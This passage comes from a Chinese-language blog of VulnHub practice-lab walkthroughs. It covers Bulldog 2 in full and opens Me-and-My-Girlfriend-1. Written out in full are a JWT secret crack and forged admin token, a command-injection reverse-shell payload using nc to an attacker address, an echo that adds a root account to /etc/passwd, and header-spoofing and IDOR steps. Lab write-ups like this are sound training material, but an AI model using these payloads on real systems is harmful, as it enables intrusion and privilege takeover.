http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: nginx&#x2F;1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Bulldog.social</span><br><span class="line">MAC Address: 08:00:27:FE:62:D8 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 43.190 days (since Tue Jan  7 22:59:12 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;253 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
<h2 id="web路径枚举-7"><a class="markdownIt-Anchor" href="#web路径枚举-7"></a> Web路径枚举</h2>
<p>尝试爆破80端口下的Web路径</p>
<p><code>dirb http://192.168.31.233/ -w</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.233&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.233&#x2F;assets (CODE:301|SIZE:179)                                           </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.233&#x2F;favicon.ico (CODE:200|SIZE:5430)</span><br></pre></td></tr></table></figure>
<p>dirb扫描路径时没有发现有价值的信息<br />
手工登录网页时发现路径<code>/login</code>，<code>/register</code>，<code>/about</code></p>
<ul>
<li>路径<code>/</code>下有一些用户评论</li>
<li>路径<code>/login</code>下存在登录点</li>
<li>路径<code>/register</code>提示无法注册</li>
</ul>
<h2 id="漏洞利用-7"><a class="markdownIt-Anchor" href="#漏洞利用-7"></a> 漏洞利用</h2>
<ul>
<li>账户爆破</li>
</ul>
<p>构造字典</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">cat dic</span><br><span class="line"></span><br><span class="line">Bulldog</span><br><span class="line">bulldog</span><br><span class="line">Social</span><br><span class="line">social</span><br><span class="line">Johnathan Abbey</span><br><span class="line">Johnathan</span><br><span class="line">johnathan</span><br><span class="line">Abbey</span><br><span class="line">abbey</span><br><span class="line">Sarah Dubree</span><br><span class="line">Sarah</span><br><span class="line">sarah</span><br><span class="line">Dubree</span><br><span class="line">dubree</span><br><span class="line">William Katz</span><br><span class="line">William</span><br><span class="line">william</span><br><span class="line">Katz</span><br><span class="line">katz</span><br><span class="line">Winston Churchy</span><br><span class="line">Winston</span><br><span class="line">winston</span><br><span class="line">Churchy</span><br><span class="line">churchy</span><br><span class="line">Bulldog Industries</span><br><span class="line">Industries</span><br><span class="line">industries</span><br><span class="line">network</span><br><span class="line">admin</span><br><span class="line">root</span><br><span class="line">123456</span><br><span class="line">a123456</span><br></pre></td></tr></table></figure>
<p>使用burpsuite进行爆破，失败</p>
<ul>
<li>账户注册</li>
</ul>
<p>审计js文件，搜索&quot;register&quot;<br />
发现两处与上传有关的函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">return l.prototype.registerUser &#x3D; function(l) &#123;</span><br><span class="line">                var n &#x3D; new x.Headers;</span><br><span class="line">                return n.append(&quot;Content-Type&quot;, &quot;application&#x2F;json&quot;),</span><br><span class="line">                this.http.post(&quot;&#x2F;users&#x2F;register&quot;, l, &#123;</span><br><span class="line">                    headers: n</span><br><span class="line">                &#125;).map(function(l) &#123;</span><br><span class="line">                    return l.json()</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;,</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">l.prototype.onRegisterSubmit &#x3D; function() &#123;</span><br><span class="line">var l &#x3D; this,</span><br><span class="line">n &#x3D; &#123;</span><br><span class="line">        name: this.name,</span><br><span class="line">        email: this.email,</span><br><span class="line">        username: this.username,</span><br><span class="line">        password: this.password</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>猜测可以以POST方式请求路径<code>/users/register</code>，并附带相应格式的json数据即可完成注册</p>
<p>在burp中构造请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;users&#x2F;register HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.31.233</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">content-type: application&#x2F;json</span><br><span class="line">Content-Length: 84</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;name&quot;: &quot;abc&quot;,</span><br><span class="line">&quot;email&quot;: &quot;abc@abc.abc&quot;,</span><br><span class="line">&quot;username&quot;: &quot;abc&quot;,</span><br><span class="line">&quot;password&quot;: &quot;abc&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得到响应</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.14.0 (Ubuntu)</span><br><span class="line">Date: Thu, 20 Feb 2020 09:32:26 GMT</span><br><span class="line">Content-Type: application&#x2F;json; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 40</span><br><span class="line">Connection: close</span><br><span class="line">X-Powered-By: Express</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">ETag: W&#x2F;&quot;28-r22PRevV1bosgiTQ0L7&#x2F;zW61meQ&quot;</span><br><span class="line"></span><br><span class="line">&#123;&quot;success&quot;:true,&quot;msg&quot;:&quot;User registered&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>使用账户<code>abc:abc</code>成功登入</p>
<p>登入之后发现自己不能执行任何功能，开始垂直提权</p>
<ul>
<li>垂直提权</li>
</ul>
<p>在登入时发现一次http交互中带有一段json</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;success&quot;:true,</span><br><span class="line">    &quot;token&quot;:&quot;JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXlsb2FkIjp7Im5hbWUiOiJhYmMiLCJlbWFpbCI6ImFiY0BhYmMuYWJjIiwidXNlcm5hbWUiOiJhYmMiLCJhdXRoX2xldmVsIjoic3RhbmRhcmRfdXNlciJ9LCJpYXQiOjE1ODIxOTE2NTYsImV4cCI6MTU4Mjc5NjQ1Nn0.zM0g_sVeMr4b5j5TYVDBmpVbliuQct6kGiuDRhDLRPg&quot;,</span><br><span class="line">    &quot;user&quot;:</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;:&quot;abc&quot;,</span><br><span class="line">        &quot;username&quot;:&quot;abc&quot;,</span><br><span class="line">        &quot;email&quot;:&quot;abc@abc.abc&quot;,</span><br><span class="line">        &quot;auth_level&quot;:&quot;standard_user&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解析JWT得到如下内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;</span><br><span class="line">&#123;&quot;payload&quot;:&#123;&quot;name&quot;:&quot;abc&quot;,&quot;email&quot;:&quot;abc@abc.abc&quot;,&quot;username&quot;:&quot;abc&quot;,&quot;auth_level&quot;:&quot;standard_user&quot;&#125;,&quot;iat&quot;:1582191656,&quot;exp&quot;:1582796456&#125;</span><br></pre></td></tr></table></figure>
<p>再审计js，查找&quot;auth_level&quot;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">l.prototype.isAdmin&#x3D;function()</span><br><span class="line">&#123;</span><br><span class="line">    var l&#x3D;localStorage.getItem(&quot;user&quot;);</span><br><span class="line">    return null!&#x3D;&#x3D;l &amp;&amp; &quot;master_admin_user&quot;&#x3D;&#x3D;JSON.parse(l).auth_level</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现&quot;master_admin_user&quot;<br />
可以尝试修改JWT来尝试提权</p>
<p>尝试爆破JWT秘钥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;brendan-rius&#x2F;c-jwt-cracker</span><br><span class="line">cd c-jwt-cracker</span><br><span class="line">chmod +x jwtcrack</span><br><span class="line">.&#x2F;jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXlsb2FkIjp7Im5hbWUiOiJhYmMiLCJlbWFpbCI6ImFiY0BhYmMuYWJjIiwidXNlcm5hbWUiOiJhYmMiLCJhdXRoX2xldmVsIjoic3RhbmRhcmRfdXNlciJ9LCJpYXQiOjE1ODIxOTE2NTYsImV4cCI6MTU4Mjc5NjQ1Nn0.zM0g_sVeMr4b5j5TYVDBmpVbliuQct6kGiuDRhDLRPg abcdefghijklmnopqrstuvwxyz 6</span><br></pre></td></tr></table></figure>
<p>得到秘钥为&quot;secret&quot;</p>
<p>修改JWT数据内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;</span><br><span class="line">&#123;&quot;payload&quot;:&#123;&quot;name&quot;:&quot;abc&quot;,&quot;email&quot;:&quot;abc@abc.abc&quot;,&quot;username&quot;:&quot;abc&quot;,&quot;auth_level&quot;:&quot;master_admin_user&quot;&#125;,&quot;iat&quot;:1582191656,&quot;exp&quot;:1582796456&#125;</span><br></pre></td></tr></table></figure>
<p>伪造JWT</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pip install pyjwt</span><br><span class="line">python</span><br><span class="line">import jwt</span><br><span class="line">jwt.encode(&#123;&quot;payload&quot;:&#123;&quot;name&quot;:&quot;abc&quot;,&quot;email&quot;:&quot;abc@abc.abc&quot;,&quot;username&quot;:&quot;abc&quot;,&quot;auth_level&quot;:&quot;master_admin_user&quot;&#125;,&quot;iat&quot;:1582191656,&quot;exp&quot;:1582796456&#125;, &#39;secret&#39;, algorithm&#x3D;&#39;HS256&#39;)</span><br><span class="line">    &#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1ODIxOTE2NTYsInBheWxvYWQiOnsidXNlcm5hbWUiOiJhYmMiLCJhdXRoX2xldmVsIjoibWFzdGVyX2FkbWluX3VzZXIiLCJuYW1lIjoiYWJjIiwiZW1haWwiOiJhYmNAYWJjLmFiYyJ9LCJleHAiOjE1ODI3OTY0NTZ9.snQ_kH-0xRB9BWxbIMyxD1sOhFzp9-TKp5QYIPZ-kpk&#39;</span><br></pre></td></tr></table></figure>
<p>在burp中开启拦截HTTP响应，登出账户并登入，用如下的数据代替身份校验步骤的JWT数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;success&quot;:true,</span><br><span class="line">    &quot;token&quot;:&quot;JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1ODIxOTE2NTYsInBheWxvYWQiOnsidXNlcm5hbWUiOiJhYmMiLCJhdXRoX2xldmVsIjoibWFzdGVyX2FkbWluX3VzZXIiLCJuYW1lIjoiYWJjIiwiZW1haWwiOiJhYmNAYWJjLmFiYyJ9LCJleHAiOjE1ODI3OTY0NTZ9.snQ_kH-0xRB9BWxbIMyxD1sOhFzp9-TKp5QYIPZ-kpk&quot;,</span><br><span class="line">    &quot;user&quot;:</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;:&quot;abc&quot;,</span><br><span class="line">        &quot;username&quot;:&quot;abc&quot;,</span><br><span class="line">        &quot;email&quot;:&quot;abc@abc.abc&quot;,</span><br><span class="line">        &quot;auth_level&quot;:&quot;master_admin_user&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>获得admin权限<br />
在dashboard发现一个Link+登入点<br />
尝试爆破，失败</p>
<ul>
<li>报错信息<br />
访问路径<code>/%aa</code><br />
获得报错信息</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">URIError: Failed to decode param &#39;&#x2F;%aa&#39;</span><br><span class="line">    at decodeURIComponent (&lt;anonymous&gt;)</span><br><span class="line">    at decode_param (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:172:12)</span><br><span class="line">    at Layer.match (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:123:27)</span><br><span class="line">    at matchLayer (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:574:18)</span><br><span class="line">    at next (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:220:15)</span><br><span class="line">    at SessionStrategy.strategy.pass (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;passport&#x2F;lib&#x2F;middleware&#x2F;authenticate.js:338:9)</span><br><span class="line">    at SessionStrategy.authenticate (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;passport&#x2F;lib&#x2F;strategies&#x2F;session.js:75:10)</span><br><span class="line">    at attempt (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;passport&#x2F;lib&#x2F;middleware&#x2F;authenticate.js:361:16)</span><br><span class="line">    at authenticate (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;passport&#x2F;lib&#x2F;middleware&#x2F;authenticate.js:362:7)</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br><span class="line">    at trim_prefix (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:317:13)</span><br><span class="line">    at &#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:284:7</span><br><span class="line">    at Function.process_params (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:335:12)</span><br><span class="line">    at next (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:275:10)</span><br><span class="line">    at initialize (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;passport&#x2F;lib&#x2F;middleware&#x2F;initialize.js:53:5)</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br></pre></td></tr></table></figure>
<p>在github上找到&quot;Bulldog-2-The-Reckoning&quot;的源码<br />
<a target="_blank" rel="noopener" href="https://github.com/Frichetten/Bulldog-2-The-Reckoning">https://github.com/Frichetten/Bulldog-2-The-Reckoning</a></p>
<p>在<code>/router/users.js</code>中发现存在<code>exec</code>函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">exec(&#96;linkplus -u $&#123;username&#125; -p $&#123;password&#125;&#96;, (error, stdout, stderr) &#x3D;&gt; &#123;</span><br><span class="line">if (error) &#123;</span><br><span class="line">  console.error(&#96;exec error: $&#123;error&#125;&#96;);</span><br><span class="line">  return;</span><br><span class="line">&#125;</span><br><span class="line">console.log(&#96;stdout: $&#123;stdout&#125;&#96;);</span><br><span class="line">console.log(&#96;stderr: $&#123;stderr&#125;&#96;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>可以在admin中的登入点实现命令注入</p>
<p>监听端口<br />
<code>nc -lvvp 2020</code></p>
<p>反弹Shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;: &quot;admin&quot;,</span><br><span class="line">  &quot;password&quot;: &quot;;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;bash -i 2&gt;&amp;1|nc 192.168.31.10 2020 &gt;&#x2F;tmp&#x2F;f&quot;</span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure>
<p>成功接收Shell</p>
<h2 id="权限提升-7"><a class="markdownIt-Anchor" href="#权限提升-7"></a> 权限提升</h2>
<p>查看文件<code>/etc/passwd</code>的权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -l &#x2F;etc&#x2F;passwd</span><br><span class="line">    -rwxrwxrwx 1 root root 1790 Feb 20 12:09 &#x2F;etc&#x2F;passwd</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<p><code>/etc/passwd</code>可写</p>
<p>构造账户信息并写入<code>/etc/passwd</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -6 hackforfun</span><br><span class="line">    $6$niT81cP.pbbCDVBZ$Tnou8n5zZHkPNF3n0EqZnouOM4eEDCxSS5OeJ21.TbLJe167Igyns87G8JbW2n5ShI23D9RuGtji1NLrRti.&#x2F;1</span><br><span class="line">echo &#39;test::$6$niT81cP.pbbCDVBZ$Tnou8n5zZHkPNF3n0EqZnouOM4eEDCxSS5OeJ21.TbLJe167Igyns87G8JbW2n5ShI23D9RuGtji1NLrRti.&#x2F;1:0:0:toor:&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwd</span><br><span class="line">su toor</span><br><span class="line">hackforfun</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure>
<hr />
<blockquote>
<p>JWT</p>
</blockquote>
<p>JWT提权时有些迷</p>
<ul>
<li>直接修改数据而不修改签名  提权成功</li>
<li>数据与签名都修改  提权成功</li>
<li>直接删掉签名部分  提权失败</li>
</ul>
<p>jwtcrack破解6位纯小写密码在虚拟机中大概需要3min。</p>
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/219056.html">JWT</a><br />
<a target="_blank" rel="noopener" href="https://blog.csdn.net/zyy1659949090/article/details/88176215">/etc/passwd</a><br />
<a target="_blank" rel="noopener" href="https://blog.blacsheep.cn/2018/09/16/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0wakanda/">WP</a><br />
<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/160755">WP</a></p>
</blockquote>
<hr />
<h1 id="me-and-my-girlfriend-1"><a class="markdownIt-Anchor" href="#me-and-my-girlfriend-1"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/">Me-and-My-Girlfriend-1</a></h1>
<p><code>2020/03/04 13:23:34</code></p>
<h2 id="端口扫描-8"><a class="markdownIt-Anchor" href="#端口扫描-8"></a> 端口扫描</h2>
<p><code>nmap -p 1-65535 -sV -A -v -T 5 -n 192.168.31.164</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.164</span><br><span class="line">Host is up (0.0015s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 57:e1:56:58:46:04:33:56:3d:c3:4b:a7:93:ee:23:16 (DSA)</span><br><span class="line">|   2048 3b:26:4d:e4:a0:3b:f8:75:d9:6e:15:55:82:8c:71:97 (RSA)</span><br><span class="line">|   256 8f:48:97:9b:55:11:5b:f1:6c:1d:b3:4a:bc:36:bd:b0 (ECDSA)</span><br><span class="line">|_  256 d0:c3:02:a1:c4:c2:a8:ac:3b:84:ae:8f:e5:79:66:76 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html).</span><br><span class="line">MAC Address: 08:00:27:06:D9:59 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.002 days (since Wed Mar  4 00:21:12 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;256 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
<h2 id="web路径枚举-8"><a class="markdownIt-Anchor" href="#web路径枚举-8"></a> Web路径枚举</h2>
<p><code>dirb http://192.168.31.233/ -w</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.164&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.164&#x2F;config&#x2F;                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.164&#x2F;index.php (CODE:200|SIZE:120)                                        </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.164&#x2F;misc&#x2F;                                                   </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.164&#x2F;robots.txt (CODE:200|SIZE:32)                                        </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.164&#x2F;server-status (CODE:403|SIZE:294)</span><br></pre></td></tr></table></figure>
<ul>
<li>访问<code>/</code>： <code>Who are you? Hacker? Sorry This Site Can Only Be Accessed local!</code></li>
<li>访问<code>robots.txt</code>：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: *</span><br><span class="line">Allow: &#x2F;heyhoo.txt</span><br></pre></td></tr></table></figure>
<ul>
<li>访问<code>/heyhoo.txt</code>：<code>Great! What you need now is reconn, attack and got the shell</code></li>
</ul>
<h2 id="漏洞利用-8"><a class="markdownIt-Anchor" href="#漏洞利用-8"></a> 漏洞利用</h2>
<p>使用hackbar进行操作<br />
添加HTTP Header: <code>X-Forwarded-For: 0.0.0.0</code><br />
请求<code>/</code>之后发现页面无变化，而浏览器路径变成<code>/?page=index</code><br />
再次请求<code>/?page=index</code>，则显示正常页面</p>
<blockquote>
<p>个人推测是仿造IP请求<code>/</code>之后，触发302跳转至<code>?page=index</code>，而跳转之后的请求进行伪造IP，所以需要进行两步操作。包括之后的请求都要先点击链接，导入hackbar，在hackbar中请求。</p>
</blockquote>
<p>在register页面中注册一个用户<br />
随后login<br />
这两步推荐在BurpSuite中操作<br />
HTTP Header加上<code>X-Forwarded-For: 0.0.0.0</code>即可</p>
<p>成功登入之后路径为<code>/index.php?page=dashboard&amp;user_id=12</code><br />
而进入profile之后可以在源码中查看当前用户名与密码</p>
<p>更改user_id参数，即可未授权访问其他用户的profile页面<br />
